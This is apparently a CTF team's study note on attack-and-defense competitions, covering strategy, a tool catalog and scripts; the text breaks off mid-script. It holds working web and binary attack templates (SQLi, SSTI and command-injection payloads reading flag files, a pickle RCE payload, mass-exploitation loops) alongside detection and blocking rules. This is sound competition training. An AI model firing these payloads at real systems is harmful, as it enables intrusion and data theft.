# Attack & Defense (A/D) — Complete (Techniques + Catalog + Scripts + Roadmap)

The biggest doc in the vault, because A/D is the biggest game: you run vulnerable services, **patch them so you keep scoring**, and **exploit the same services on every other team** every round. This is the DCTF **final** format. Pairs with [[DCTF Finals Playbook]], [[Pwn-Complete]], [[Networking-Complete]].

> **Scope:** only the machines/services the organizers assign to you. Never touch game infra or unassigned hosts. "Max real, no fabrication" — every tool here is a real project; verify it's alive before the event.

> **Mental model — the three clocks.** (1) **SLA clock:** your services must answer the checker every tick or you bleed points. (2) **Attack clock:** flags rotate every tick, so an exploit must run *every* tick against *every* team. (3) **Defense clock:** the moment you find a bug, so can everyone else — patch yours before they mass-fire it. Win = keep SLA up + steal flags + deny flags.

---

# TECHNIQUES (explained + real-life scenarios)

## A. Pre-event preparation
1. **Assign roles** — captain, vuln-hunters, exploit-dev, defender, flag-runner. *Scenario:* 5-person team splits so nobody duplicates work in the first chaotic hour.
2. **Pre-install your toolchain** — farm, Tulip, pwntools, decompilers ready on a VM image. *Scenario:* you don't `pip install` under fire; your kit boots ready.
3. **Pre-write an exploit template** — `exploit(ip)->flags` skeleton done beforehand. *Scenario:* you only fill in the bug, not the plumbing.
4. **Pre-write a submit client** — talk to the gameserver API in advance. *Scenario:* the farm submits from minute one because the protocol's already coded.
5. **Rehearse on a practice gameserver** — FAUST/ForcAD/CTForge locally. *Scenario:* the team has run the full loop before, so finals aren't the first time.
6. **Shared notes + board** — who's on which service, what's found. *Scenario:* a Kanban of services prevents two people reversing the same binary.
7. **VPN/connectivity test** — confirm you can reach team IPs + gameserver. *Scenario:* you fix routing before the clock starts, not after.
8. **Know the flag format + submit limits** — regex, rate caps, expiry. *Scenario:* you avoid wrong-flag penalties and tune farm batch size.
9. **Snapshot tooling ready** — scripts to back up and restore services. *Scenario:* a bad patch is one command from rollback.
10. **Comms channel** — a dedicated voice/chat with clear callouts. *Scenario:* "service2 is popped, patch now" reaches everyone instantly.

## B. First-hour hardening (the grace period)
11. **Snapshot every service immediately** — tar/git/docker commit. *Scenario:* you can always return to a known-good state.
12. **Change all default credentials** — DB, admin panels, service accounts. *Scenario:* the dumbest loss — a default password — is closed first.
13. **Inventory listening services** — `ss -tlnp`, `docker ps`. *Scenario:* you learn exactly what you must keep alive for SLA.
14. **Back up service source** — copy each app's code before editing. *Scenario:* you diff later patches against the original.
15. **Start full traffic capture** — `tcpdump -w` on all service ports. *Scenario:* every attack against you is now recorded for stealing.
16. **Baseline a healthy request** — capture what the checker expects. *Scenario:* you can tell later if a patch broke functionality.
17. **Disable obvious debug/backdoors** — remove dev endpoints shipped in the image. *Scenario:* a `/debug` route the authors left is closed before anyone finds it.
18. **Rotate app secrets/keys** — signing keys, API tokens in config. *Scenario:* a leaked key in the image can't be used against you.
19. **Record file hashes of web roots** — tripwire for webshells. *Scenario:* a new file later screams "someone dropped a shell."
20. **Don't break SLA while hardening** — test each change against the checker. *Scenario:* over-zealous hardening that drops SLA costs more than a few stolen flags.

## C. Recon & service inventory
21. **Map ports to services** — which binary/app owns each port. *Scenario:* you route each service to the right specialist.
22. **Classify each service** — web / pwn / crypto / misc. *Scenario:* triage tells you which playbook applies.
23. **Pull the service source** — from the box or provided archive. *Scenario:* you audit code instead of black-box guessing.
24. **Identify the checker's touchpoints** — what endpoints it hits. *Scenario:* you know which code paths are SLA-critical and must not break.
25. **Find where flags are stored** — DB table, file, memory. *Scenario:* the exploit's goal is clear: read *that* store.
26. **Diff against upstream** — if the service is a known app. *Scenario:* the organizers' intentional bug is the one line that differs from upstream.
27. **Enumerate your own box** — users, cron, sudo, SUID. *Scenario:* you spot an attacker's persistence foothold early.
28. **Note shared libraries/components** — one lib bug hits several services. *Scenario:* patching the shared parser fixes three services at once.

## D. Finding the bug — web services
29. **Auth bypass review** — weak session/signature logic. *Scenario:* a guessable session token lets you read any user's flag.
30. **SQL injection** — unparameterized queries. *Scenario:* `' UNION SELECT flag FROM flags--` dumps every flag.
31. **Path traversal / LFI** — user-controlled file paths. *Scenario:* `../../flags/flag.txt` reads the store directly.
32. **SSTI** — user input in a template. *Scenario:* `{{config}}` leaks the signing key; you forge admin.
33. **Insecure deserialization** — pickle/PHP/Java objects. *Scenario:* a crafted object runs code and cats the flag.
34. **Command injection** — shelling out on input. *Scenario:* `; cat /flags/*` in a filename field.
35. **SSRF to internal flag store** — server fetches your URL. *Scenario:* point it at the internal flag API.
36. **IDOR / broken access control** — object IDs not scoped. *Scenario:* increment an ID to read another team-user's flag.
37. **Weak crypto in tokens** — JWT alg=none / weak secret. *Scenario:* forge an admin JWT, read all flags. (see [[Crypto-Complete]])
38. **Race condition** — TOCTOU in a flag handler. *Scenario:* parallel requests leak a flag mid-write.
39. **Logic flaw** — intended feature misused. *Scenario:* a "share" feature discloses private flags.

## E. Finding the bug — pwn / binary services
40. **Stack overflow in the service** — unbounded read. *Scenario:* overflow → ret2libc → read the flag file. (see [[Pwn-Complete]])
41. **Format string** — user input to printf. *Scenario:* leak + GOT overwrite to pop a shell on the service.
42. **Heap bug (UAF/overflow)** — classic heap primitives. *Scenario:* tcache poisoning → arbitrary read of the flag.
43. **Off-by-one / integer bug** — size miscalculation. *Scenario:* a one-byte overflow pivots into control.
44. **Match the remote libc** — pull the provided libc/ld. *Scenario:* your local exploit's offsets line up with the server.
45. **Leak → compute → exploit** — the universal flow. *Scenario:* leak libc, fix base, ROP to `open/read/write` the flag.
46. **ORW instead of shell (seccomp)** — read the flag directly. *Scenario:* `execve` blocked, so your shellcode opens and prints the flag file.
47. **Patch-diff the binary** — compare to a clean build if given. *Scenario:* the introduced bug is the one changed function.

## F. Finding the bug — crypto / misc services
48. **Weak key / nonce reuse** — service misuses crypto. *Scenario:* reused CTR nonce lets you XOR out a flag. (see [[Crypto-Complete]])
49. **Padding oracle in the service** — validity leak. *Scenario:* decrypt the flag token without the key.
50. **Signature forgery** — length extension / RSA multiplicative. *Scenario:* forge a valid admin token to pull flags.
51. **Protocol flaw** — custom binary protocol bug. *Scenario:* a malformed frame reveals memory with the flag.
52. **Default/guessable creds in a service** — telnet/redis/etc. *Scenario:* an unauthenticated Redis holds flags as keys.

## G. Exploit development & weaponization
53. **Parameterize by target IP** — one script, any team. *Scenario:* `exploit.py 10.60.3.1` works for every team unchanged.
54. **Return flags on stdout** — farm-friendly output. *Scenario:* the farm captures whatever matches the flag regex.
55. **Make it fast & resilient** — short timeouts, catch all errors. *Scenario:* one dead target can't stall the batch of 40.
56. **Handle flag IDs** — many services give per-round "flag IDs". *Scenario:* you fetch each team's current flag ID, then target it.
57. **Idempotent + stateless** — safe to re-run each tick. *Scenario:* the farm fires it every 60s with no side effects.
58. **Test against your own box first** — you have the same vuln. *Scenario:* confirm it extracts your own flag before mass-firing.
59. **Multiple exploits per service** — redundancy. *Scenario:* when a team patches bug A, you switch to bug B automatically.
60. **Obfuscate your traffic (lightly)** — vary payloads. *Scenario:* harder for victims to copy your exact request from pcap.

## H. Flag farm & submission operations
61. **Run a flag farm** — central collector + submitter. *Scenario:* DestructiveFarm/S4DFarm dedups and submits so you focus on exploits.
62. **Register exploits in the farm** — it schedules them per team. *Scenario:* add `sploit.py`; the farm runs it against all teams each tick.
63. **Batch submissions** — respect the gameserver's rate limit. *Scenario:* submit 100 flags/request instead of tripping a cap.
64. **Dedup flags** — don't resubmit accepted ones. *Scenario:* the farm tracks accepted/old/rejected to save quota.
65. **Monitor accept/reject stats** — spot a broken exploit fast. *Scenario:* sudden rejects mean flags expired or format changed.
66. **Handle flag expiry/rotation** — only current flags score. *Scenario:* the farm discards stale flags automatically.
67. **Fallback manual submit** — a socket/HTTP one-liner. *Scenario:* if the farm UI dies, you still push flags by hand.

## I. Mass exploitation & rotation
68. **Enumerate all team IPs** — build `targets.txt`. *Scenario:* your loop hits every opponent, not just one.
69. **Pull flag IDs from the gameserver** — per-team, per-tick. *Scenario:* the attack-info endpoint tells you what to request.
70. **Fire every tick** — loop on the round interval. *Scenario:* flags rotate ~every 60–120s; you re-collect continuously.
71. **Skip patched/dead targets gracefully** — keep the loop alive. *Scenario:* a team that patched just returns no flag; others still score.
72. **Prioritize unpatched teams** — easy points first. *Scenario:* early game, most teams are unpatched — harvest aggressively.
73. **Switch exploits as teams patch** — multi-bug rotation. *Scenario:* mid-game you shift to a second, rarer bug.

## J. Traffic analysis & exploit stealing
74. **Capture all service traffic** — continuous pcap. *Scenario:* every exploit used on you is on disk to replay.
75. **Analyze flows in Tulip/Caronte/pkappa2** — searchable UI. *Scenario:* filter to your service, see the malicious request that stole a flag.
76. **Flag-pattern search in traffic** — find who exfiltrated flags. *Scenario:* search pcap for the flag regex to find the attack request.
77. **Reconstruct an attacker's request** — turn a flow into a script. *Scenario:* Tulip auto-generates a pwntools/requests snippet from the flow.
78. **Replay stolen exploits at everyone** — free points. *Scenario:* a strong team's 0-day, captured from your pcap, now hits all teams for you.
79. **Correlate attacks to a bug** — many teams hitting one endpoint = that's the vuln. *Scenario:* traffic tells you where to patch even before you find the bug in code.
80. **Live-watch with ngrep** — instant visibility. *Scenario:* `ngrep flag` shows flags leaving your box in real time.

## K. Patching without breaking SLA
81. **Minimal targeted patch** — fix the one bug, nothing else. *Scenario:* add input validation; don't rewrite the app.
82. **Parameterize the vulnerable query** — kill SQLi. *Scenario:* prepared statements stop the UNION dump, feature still works.
83. **Bounds-check the binary input** — or patch the binary. *Scenario:* shrink a read length; recompile or byte-patch.
84. **Validate/escape path inputs** — stop traversal. *Scenario:* normalize + whitelist the path; LFI closed.
85. **Keep the checker passing** — run it after every patch. *Scenario:* you verify functionality before redeploying.
86. **Backup before patch, rollback ready** — safety net. *Scenario:* a patch that drops SLA is reverted in seconds.
87. **Patch shared components once** — fix the library. *Scenario:* one parser fix secures every service that uses it.
88. **Re-fire your exploit after patching** — confirm you closed it. *Scenario:* your own exploit now fails against you = patch works.

## L. Virtual patching / runtime defense
89. **Reverse-proxy input filter** — drop known payloads. *Scenario:* an nginx/mitmproxy rule blocks the exploit string while you code a real fix.
90. **WAF (ModSecurity)** — ruleset in front of the app. *Scenario:* CRS blocks the SQLi pattern buying you time.
91. **LD_PRELOAD shim (binary svc)** — wrap a dangerous function. *Scenario:* intercept `system`/`gets` to neutralize the bug without source.
92. **seccomp/AppArmor confinement** — limit what the service can do. *Scenario:* even if popped, the service can't exec a shell.
93. **iptables payload/string match** — crude but fast. *Scenario:* drop packets containing the exact exploit signature.
94. **Rate-limit abusive clients** — slow mass exploitation. *Scenario:* a team hammering your service gets throttled.
95. **Egress filtering** — stop reverse shells calling out. *Scenario:* the service can't connect outbound to an attacker.

## M. Detection & monitoring
96. **Tail service logs** — watch for exploitation. *Scenario:* a spike of 500s pinpoints the attacked endpoint.
97. **File-integrity watch** — inotify on web roots. *Scenario:* a dropped `shell.php` triggers an alert instantly.
98. **Process monitoring (pspy/auditd)** — spot rogue execs. *Scenario:* an unexpected `nc`/`bash -i` reveals a live attacker.
99. **Connection monitoring** — `ss`/netstat deltas. *Scenario:* a new outbound connection is an exfil or shell.
100. **Honeypot endpoints** — fake path that only an attacker hits. *Scenario:* a request to `/admin_backup` flags a scanner and its IP.
101. **Alert on flag egress** — detect flags leaving. *Scenario:* ngrep/Suricata rule fires when a flag pattern exits.
102. **Diff config/binaries periodically** — catch tampering. *Scenario:* an attacker edited your binary to backdoor it; the diff catches it.

## N. Anti-persistence (defending)
103. **Hunt webshells** — new/modified files, odd timestamps. *Scenario:* you find and remove the attacker's uploaded shell.
104. **Check cron/at/systemd timers** — scheduled re-entry. *Scenario:* an added cron re-drops a shell every minute; you kill it.
105. **Audit users/SSH keys** — added accounts/authorized_keys. *Scenario:* a rogue key in `authorized_keys` is the backdoor.
106. **Check SUID/capabilities** — privilege backdoors. *Scenario:* a new SUID bash lets an attacker re-escalate; you fix perms.
107. **Inspect LD_PRELOAD/ld.so.preload** — library hijack. *Scenario:* a preload entry backdoors every process; you remove it.
108. **Kill rogue processes/listeners** — active implants. *Scenario:* a bind shell on a high port is terminated.
109. **Rotate secrets after a breach** — assume keys leaked. *Scenario:* you re-sign with a fresh key so stolen keys are useless.
110. **Full redeploy if infested** — nuke to known-good. *Scenario:* too many implants → restore the clean snapshot.

## O. Infrastructure & system hardening
111. **Least-privilege services** — run as non-root. *Scenario:* a popped service can't read `/root`.
112. **Firewall default-deny egress** — only allow needed out. *Scenario:* reverse shells and exfil are blocked by policy.
113. **Disable unused services** — shrink attack surface. *Scenario:* an unneeded daemon that was vulnerable is simply off (if not SLA-scored).
114. **Patch the OS basics** — obvious CVEs. *Scenario:* a known local-root is patched so an app-popper can't become root.
115. **Separate services** — containers/users per service. *Scenario:* one compromised service can't read another's flags.
116. **Read-only where possible** — mount web root ro. *Scenario:* attackers can't drop a webshell on a read-only FS.
117. **Harden SSH** — keys only, no root login. *Scenario:* brute-force/credential paths to your box are closed.

## P. Credentials & secrets
118. **Rotate DB/app passwords first hour** — kill shipped defaults. *Scenario:* the authors' `admin:admin` can't be reused.
119. **Rotate signing/API keys** — invalidate leaked ones. *Scenario:* a key visible in the image no longer forges tokens.
120. **Scrub secrets from logs** — don't leak your own. *Scenario:* a token printed to a world-readable log is removed.
121. **Vault team creds** — don't paste in shared chat plaintext. *Scenario:* your own infra creds aren't exposed to a watching attacker.

## Q. Scoring strategy & time management
122. **SLA first** — a down service often loses more than a few stolen flags. *Scenario:* you never "harden" a service into failing the checker.
123. **Harvest early** — most teams unpatched at start. *Scenario:* the first 30 minutes of attack are the richest; prioritize firing.
124. **Patch the widely-exploited bug first** — triage by traffic. *Scenario:* the endpoint everyone hits is your top patch priority.
125. **Keep exploits running unattended** — the farm never sleeps. *Scenario:* while you reverse service 3, service 1's exploit still earns.
126. **Balance offense/defense by score delta** — adapt. *Scenario:* leading on defense but low on attack → shift people to exploits.
127. **Don't over-engineer** — simplest working exploit wins. *Scenario:* a one-line SQLi beats a fancy chain you can't finish.
128. **Endgame hold** — late game, protect SLA, keep flags flowing. *Scenario:* stop risky patches that could break services at the finish.

## R. Team coordination
129. **One owner per service** — no duplicated effort. *Scenario:* clear ownership means nothing is both ignored and double-worked.
130. **Broadcast found bugs** — but patch yours first. *Scenario:* "service2 SQLi, patching now, exploit incoming" keeps the team synced.
131. **Shared target/flag-ID source** — everyone's farm uses it. *Scenario:* one script pulls attack-info; all exploits consume it.
132. **Status board** — service → {vuln?, patched?, exploit live?}. *Scenario:* a glance shows what still needs attention.
133. **Handoff exploits cleanly** — vuln-hunter → exploit-dev → farm. *Scenario:* a found bug becomes a farmed exploit in minutes.

## S. Common pitfalls
134. **Patching a service into DOWN** — SLA tanks. *Scenario:* an over-aggressive patch fails the checker; you lose more than you saved.
135. **Hardcoding one target IP** — you only hit one team. *Scenario:* forgetting to parameterize wastes an exploit on a single opponent.
136. **Not capturing traffic** — you miss free exploits. *Scenario:* a team pops you with a 0-day you could've stolen but didn't record.
137. **Ignoring flag rotation** — one-shot grab scores one tick. *Scenario:* you "solved" it but forgot to loop; points trickle instead of flow.
138. **No backup before patching** — can't recover. *Scenario:* a broken patch with no snapshot means a dead service.
139. **Taking a service offline "to be safe"** — usually a net loss. *Scenario:* blocking all traffic fails SLA worse than getting popped.
140. **Leaking your own exploit plaintext** — others copy it. *Scenario:* your unique payload appears in every victim's pcap and gets reused.
141. **Attacking unassigned hosts/infra** — rule violation, DQ risk. *Scenario:* scanning the gameserver gets your team penalized.

---

# CATALOG (real tools — verify before the event)

## Flag farms / submitters
1. **DestructiveFarm** — reference exploit farm (solo-friendly) `github.com/DestructiveVoice/DestructiveFarm`
2. **DestructiveFarm (VaiTon fork)** — maintained fork `github.com/VaiTon/DestructiveFarm`
3. **S4DFarm** — C4T BuT S4D team farm `github.com/C4T-BuT-S4D/S4DFarm`
4. **ExploitFarm** — Pwnzer0tt1 attacker+submitter `github.com/Pwnzer0tt1/exploitfarm`
5. **CookieFarm** — ByteTheCookies Go+Python framework `github.com/ByteTheCookies/CookieFarm`
6. **Quickscope** — lightweight exploit shooter+tracker (PyPI `quickscope`)
7. **farm.hs** — Haskell parallel exploit runner `github.com/gnull/farm.hs`
8. **Avala** — A/D exploit manager/farm (verify current repo)

## Traffic analysis (steal exploits)
9. **Tulip** — A/D flow analyzer, auto-generates attack snippets `github.com/OpenAttackDefenseTools/tulip`
10. **Caronte** — A/D network flow analyzer `github.com/eciavatta/caronte`
11. **pkappa2** — Go A/D traffic analysis tool `github.com/spq/pkappa2`
12. **Flower** — Tulip's predecessor `github.com/secgroup/flower`
13. **ngrep** — live payload grep `apt install ngrep`
14. **tcpdump** — capture everything
15. **Wireshark/tshark** — deep flow inspection
16. **tcpflow** — reassemble TCP streams
17. **Suricata** — IDS rules / flag-egress alerts
18. **Zeek** — flow logging at scale
19. **Arkime** — index + search captured traffic

## Practice gameservers / frameworks
20. **FAUST Gameserver** — A/D gameserver for practice `github.com/fausecteam/ctf-gameserver`
21. **ForcAD** — Python A/D gameserver `github.com/pomo-mondreganto/ForcAD`
22. **CTForge** — jeopardy + A/D framework `github.com/secgroup/ctforge`
23. **enochecker** — write service checkers `github.com/enowars/enochecker`
24. **saarctf gameserver** — reference A/D infra `github.com/MarkusBauer/saarctf-gameserver`
25. **ad-fausty / checker examples** — learn checker behavior

## Exploit development
26. **pwntools** — exploit dev library `pip install pwntools`
27. **requests / httpx** — web exploit HTTP
28. **ROPgadget / ropper** — gadgets
29. **one_gadget** — one-shot shells `gem install one_gadget`
30. **pwninit** — match remote libc `github.com/io12/pwninit`
31. **libc-database** — ID libc from leak `github.com/niklasb/libc-database`
32. **angr** — symbolic solving `pip install angr`
33. **Ghidra** — decompile the service `ghidra-sre.org`
34. **radare2 / rizin** — CLI RE
35. **gdb + pwndbg/GEF** — dynamic analysis
36. **patchelf** — set interpreter/rpath for the given libc

## Web service testing
37. **Burp Suite** — intercept/repeat/fuzz `portswigger.net`
38. **mitmproxy** — scriptable proxy (also virtual-patching) `mitmproxy.org`
39. **sqlmap** — SQLi automation `github.com/sqlmapproject/sqlmap`
40. **ffuf** — endpoint/param fuzzing `github.com/ffuf/ffuf`
41. **tplmap** — SSTI `github.com/epinna/tplmap`
42. **jwt_tool** — JWT attacks `github.com/ticarpi/jwt_tool`
43. **PayloadsAllTheThings** — payload reference `github.com/swisskyrepo/PayloadsAllTheThings`
44. **nuclei** — templated checks across hosts `github.com/projectdiscovery/nuclei`

## Recon / scanning (your own + assigned scope)
45. **nmap** — ports/services
46. **masscan** — fast wide scan
47. **netcat / ncat / socat** — connect/relay
48. **httpx** — probe web services across teams
49. **rustscan** — fast port scan

## Defense — patch / virtual-patch
50. **git** — version & revert service source
51. **ModSecurity + OWASP CRS** — WAF
52. **nginx / HAProxy** — reverse-proxy filtering
53. **mitmproxy (patch mode)** — rewrite requests/responses
54. **iptables / nftables** — packet/string filtering
55. **fail2ban** — ban abusive IPs
56. **AppArmor / SELinux** — confine services
57. **seccomp (libseccomp/pledge)** — syscall allowlist
58. **LD_PRELOAD shims** — wrap dangerous libc calls
59. **ModSecurity rules repo** — prebuilt CRS

## Defense — monitor / detect
60. **pspy** — process snooping without root `github.com/DominicBreuker/pspy`
61. **auditd** — syscall/exec auditing
62. **inotifywait (inotify-tools)** — file-change watch
63. **sysmon-for-linux** — rich event logging
64. **osquery** — query host state
65. **Wazuh / OSSEC** — HIDS
66. **chkrootkit / rkhunter** — rootkit detection
67. **Linux Smart Enumeration (lse.sh)** — audit your own box
68. **LinPEAS** — find privesc/persistence footholds on your box

## Infra / ops
69. **tmux** — persistent sessions for farms/exploits
70. **ansible** — push patches/hardening to boxes
71. **rsync / tar** — backups/snapshots
72. **docker** — snapshot/rollback services
73. **ssh / sshpass** — box access
74. **CTFd** — common gameserver (API scripting)
75. **jq** — parse gameserver JSON (attack-info)

## Crypto / misc helpers
76. **RsaCtfTool** — RSA attacks `github.com/RsaCtfTool/RsaCtfTool`
77. **CyberChef** — quick decode
78. **hashcat / john** — crack weak secrets
79. **featherduster** — automated cryptanalysis
80. **xortool** — XOR analysis

## Reference / learning
81. **ljagiello/ctf-skills** — skill notes incl. A/D
82. **awesome-ctf (apsdehal)** — curated meta-list
83. **Wavestone DefCamp A/D writeup** — strategy account
84. **ENOWARS writeups** — modern A/D service analysis
85. **saarsec / C4T BuT S4D blogs** — team methodology

> Not fabricated to a round number — this is the real, usable A/D toolset (~85 entries). Padding it to 500 would mean inventing repos that waste your time at the event.

---

# SCRIPTS (copy-paste; 🟢 easy / 🟡 medium / 🔴 hard)

Assume `targets.txt` (team IPs) and the gameserver's attack-info endpoint. Edit flag regex + ports per event.

## Farm & submission
🟢 1. flag regex
```python
import re
FLAG_RE = re.compile(rb'[A-Z0-9]{31}=')   # set to the event format
```
🟢 2. mass-fire a parameterized exploit
```bash
for ip in $(cat targets.txt); do python3 sploit.py "$ip"; done | sort -u
```
🟡 3. exploit → farm (stdout flags)
```python
import sys,re
TARGET=sys.argv[1]; FLAG=re.compile(r'[A-Z0-9]{31}=')
# ... attack TARGET, collect text ...
for f in FLAG.findall(text): print(f)
```
🟡 4. manual submit over TCP (pwntools)
```python
from pwn import remote
s=remote("gameserver",31337)
for f in open("flags.txt"): s.sendline(f.strip().encode()); print(s.recvline())
```
🟡 5. manual submit over HTTP API
```python
import requests
r=requests.put("https://gameserver/flags", headers={"X-Team-Token":"TOK"}, json=open_flags)
print(r.json())   # accepted / rejected / old
```
🟡 6. pull attack-info (flag IDs per team)
```python
import requests
info=requests.get("https://gameserver/attack.json").json()
# info[service][team]["flag_id"] → feed into your exploit
```
🟡 7. loop every tick
```bash
while true; do for ip in $(cat targets.txt); do python3 sploit.py "$ip"; done | submit; sleep 60; done
```
🟡 8. dedup accepted flags
```bash
cat new.txt >> all.txt; sort -u all.txt -o all.txt
```
🟢 9. build targets.txt from a subnet
```bash
for i in $(seq 1 254); do echo "10.60.$i.1"; done > targets.txt
```
🟡 10. DestructiveFarm exploit skeleton
```python
#!/usr/bin/env python3
import sys
HOST=sys.argv[1]
# print flags to stdout; the farm captures them by regex
```

## Exploit templates — web
🟡 11. SQLi UNION dump flags
```python
import requests,sys
ip=sys.argv[1]
r=requests.get(f"http://{ip}:5000/item",params={"id":"1 UNION SELECT flag,2 FROM flags-- -"},timeout=5)
print(r.text)
```
🟡 12. blind SQLi (boolean) — see [[Forensics-Complete]]/blind_sqli pattern
```python
# char-by-char via a true/false oracle; parameterize ip
```
🟡 13. path traversal read
```python
import requests,sys
print(requests.get(f"http://{sys.argv[1]}:8080/download",params={"f":"../../flags/flag.txt"},timeout=5).text)
```
🟡 14. SSTI (Jinja2) RCE → cat flags
```python
import requests,sys
p="{{cycler.__init__.__globals__.os.popen('cat /flags/*').read()}}"
print(requests.post(f"http://{sys.argv[1]}:5000/render",data={"tpl":p},timeout=5).text)
```
🟡 15. command injection
```python
import requests,sys
print(requests.get(f"http://{sys.argv[1]}/ping",params={"host":"x; cat /flags/*"},timeout=5).text)
```
🟡 16. JWT alg=none forge (admin) → read flags
```python
import base64,json
b64=lambda b:base64.urlsafe_b64encode(b).decode().rstrip("=")
tok=b64(b'{"alg":"none"}')+"."+b64(json.dumps({"user":"admin"}).encode())+"."
# send as Authorization: Bearer <tok>
```
🟡 17. IDOR sweep user IDs
```python
import requests,sys
for i in range(1,200):
    t=requests.get(f"http://{sys.argv[1]}/note/{i}",timeout=3).text
    if "{" in t: print(i,t)
```
🟡 18. SSRF to internal flag API
```python
import requests,sys
print(requests.get(f"http://{sys.argv[1]}/fetch",params={"url":"http://127.0.0.1:9000/flag"},timeout=5).text)
```
🟡 19. insecure deserialization (pickle) — construct payload
```python
import pickle,os,base64
class E:  # only for a service you're authorized to test
    def __reduce__(self): return (os.system,("cat /flags/* > /tmp/o",))
print(base64.b64encode(pickle.dumps(E())).decode())
```
🟡 20. generic HTTP exploit wrapper
```python
import sys,re,requests
ip=sys.argv[1]; FLAG=re.compile(r'[A-Z0-9]{31}=')
try: t=requests.get(f"http://{ip}:5000/vuln",timeout=5).text
except Exception as e: print("ERR",ip,e,file=sys.stderr); sys.exit(1)
[print(f) for f in FLAG.findall(t)]
```

## Exploit templates — pwn
🟡 21. remote service pwn skeleton
```python
from pwn import *; import sys
context.binary=elf=ELF("./svc"); libc=ELF("./libc.so.6")
io=remote(sys.argv[1], 1337)
# ... leak, set libc.address, ROP to open/read/write /flag ...
io.interactive()
```
🟡 22. ORW read flag (seccomp service)
```python
from pwn import *
sc=asm(shellcraft.amd64.linux.cat("/flag"))   # or open+read+write
```
🟡 23. match libc then exploit
```bash
pwninit --bin ./svc --libc ./libc.so.6   # produces patched bin + template
```

## Traffic / stealing
🟢 24. capture all service ports
```bash
sudo tcpdump -i any -w round_$(date +%s).pcap 'tcp portrange 1000-9999'
```
🟢 25. live-watch flags leaving
```bash
sudo ngrep -q -W byline -P '' '[A-Z0-9]{31}=' tcp
```
🟡 26. find attack requests in pcap
```bash
tshark -r cap.pcap -Y 'frame contains "UNION"' -T fields -e http.request.full_uri
```
🟡 27. grep flags in captured traffic
```bash
tshark -r cap.pcap -T fields -e data -e http.file_data | xxd -r -p 2>/dev/null | grep -aoE '[A-Z0-9]{31}='
```
🟡 28. Tulip ingest (inotify on pcaps)
```bash
# point Tulip's ingestor at your pcap dir; it auto-ingests + lets you build snippets
```
🟡 29. replay a stolen request
```bash
curl -s "http://VICTIM:5000/vuln" -d "$(cat stolen_body.txt)"
```

## Patch / backup / rollback
🟢 30. snapshot a service (tar)
```bash
tar czf /root/bak_svc1_$(date +%s).tgz /srv/svc1
```
🟢 31. git-init a service for diff/revert
```bash
cd /srv/svc1 && git init -q && git add -A && git commit -qm base
```
🟢 32. docker snapshot + rollback
```bash
docker commit svc1 svc1:good      # later: docker run ... svc1:good
```
🟡 33. patch SQLi (parameterize) then test
```bash
sed -i 's/.*cursor.execute.*/    cursor.execute("...%s...",(x,))/' app.py
# then run the checker / curl the normal request to confirm SLA
```
🟡 34. verify your own exploit now fails
```bash
python3 sploit.py 127.0.0.1 && echo "STILL VULN" || echo "patched"
```
🟡 35. rollback to snapshot
```bash
tar xzf /root/bak_svc1_<ts>.tgz -C / && systemctl restart svc1
```
🟡 36. diff current vs backup (spot tampering)
```bash
diff -r /root/base/svc1 /srv/svc1
```

## Virtual patching / runtime defense
🟡 37. iptables drop a payload signature
```bash
iptables -A INPUT -p tcp --dport 5000 -m string --algo bm --string "UNION SELECT" -j DROP
```
🟡 38. block an attacker IP
```bash
iptables -A INPUT -s ATTACKER_IP -j DROP
```
🟡 39. nginx virtual-patch (drop bad URI)
```nginx
location / { if ($request_uri ~* "\.\./|UNION\s+SELECT") { return 403; } proxy_pass http://127.0.0.1:5000; }
```
🟡 40. mitmproxy request filter (python addon)
```python
def request(flow):
    if b"../" in flow.request.raw_content: flow.response = __import__("mitmproxy").http.Response.make(403)
```
🟡 41. egress default-deny (keep established)
```bash
iptables -P OUTPUT DROP; iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT; iptables -A OUTPUT -o lo -j ACCEPT
```
🟡 42. LD_PRELOAD neutralize system()
```c
// nosys.c: int system(const char*c){return 0;}  gcc -shared -fPIC nosys.c -o nosys.so
// run service with LD_PRELOAD=/root/nosys.so (only if it doesn't need system())
```
🟡 43. ModSecurity quick on (nginx/apache)
```bash
# enable mod_security + OWASP CRS in front of the app; SecRuleEngine On
```

## Monitoring / detection
🟢 44. tail a service log for errors
```bash
tail -F /var/log/svc1/*.log | grep -E "Traceback|500|UNION"
```
🟡 45. watch web root for webshell drops
```bash
inotifywait -mr /srv/svc1 -e create,modify --format '%w%f %e'
```
🟡 46. pspy process watch (no root needed)
```bash
./pspy64
```
🟡 47. new-connection watch
```bash
watch -n2 "ss -tnp | sort | uniq -c"
```
🟡 48. alert when a flag pattern egresses
```bash
sudo ngrep -q '[A-Z0-9]{31}=' 'tcp and not dst host GAMESERVER' && echo "FLAG LEAK"
```
🟡 49. honeypot endpoint hit alert
```bash
tail -F access.log | grep --line-buffered admin_backup | while read l; do echo "SCAN: $l"; done
```
🟡 50. hash-baseline web root (tripwire)
```bash
find /srv/svc1 -type f -exec sha256sum {} \; | sort > /root/base.sha ; # later: sha256sum -c
```

## Anti-persistence (defend your box)
🟡 51. list recently modified files
```bash
find / -xdev -mmin -30 -type f 2>/dev/null | grep -vE '/proc|/sys|/run'
```
🟡 52. audit cron/at/systemd timers
```bash
for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done; systemctl list-timers --all
```
🟡 53. check authorized_keys everywhere
```bash
find / -name authorized_keys 2>/dev/null -exec echo {} \; -exec cat {} \;
```
🟡 54. find SUID binaries (new backdoors)
```bash
find / -perm -4000 -type f 2>/dev/null
```
🟡 55. check ld.so.preload
```bash
cat /etc/ld.so.preload 2>/dev/null; env | grep LD_PRELOAD
```
🟡 56. list listeners + owning process
```bash
ss -tlnp
```
🟡 57. kill a rogue bind shell
```bash
fuser -k 4444/tcp
```
🟡 58. find new users (uid changes)
```bash
awk -F: '$3>=1000{print $1,$3}' /etc/passwd
```
🟡 59. LinPEAS / lse on your own box
```bash
./linpeas.sh | tee /root/linpeas.txt   # find footholds attackers will use
```
🟡 60. redeploy from clean snapshot (nuke persistence)
```bash
docker rm -f svc1 && docker run -d --name svc1 svc1:good
```

## Infra / ops / coordination
🟢 61. keep farms alive in tmux
```bash
tmux new -d -s farm 'while true; do ./fire_all.sh | submit; sleep 60; done'
```
🟡 62. push a patch to the box via ssh
```bash
scp app_patched.py user@BOX:/srv/svc1/app.py && ssh user@BOX systemctl restart svc1
```
🟡 63. ansible patch many services
```bash
ansible all -i hosts -m copy -a "src=app.py dest=/srv/svc1/app.py" -b
```
🟡 64. parse attack-info with jq
```bash
